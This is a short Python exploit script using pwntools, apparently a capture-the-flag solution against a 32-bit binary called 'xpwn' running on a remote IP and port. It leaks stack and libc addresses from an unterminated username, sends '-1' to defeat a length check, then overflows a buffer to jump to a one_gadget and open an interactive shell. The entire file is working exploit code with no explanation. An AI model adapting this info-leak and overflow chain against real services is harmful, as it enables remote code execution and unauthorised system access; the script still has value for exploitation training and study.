from pwn import*
elf=ELF("./xpwn")
context.log_level="debug"

debug=0
if debug:
	p=process("./xpwn")
	lib=ELF("./libc-2.23_32.so")
	onegadget=0x3ac62
	pause()
else:
	p=remote("116.85.48.105", 5005)
	lib=ELF("./dd.so")
	onegadget=0x3a812

p.sendafter("username: ","aaaa"*10)
p.recvuntil("aaaa"*10)

leak=p.recv()
ebp=u32(leak[0:4])-0x70
setbuf=u32(leak[4:8])-0x15
info("ebp: 0x%x",ebp)
info("setbuff: 0x%x",setbuf)

onegadget=setbuf-lib.symbols['setbuf']+onegadget
payload=p32(ebp+120)*20+p32(onegadget)

p.sendafter("password: ","-1")

p.sendafter("): ",payload)
p.interactive()
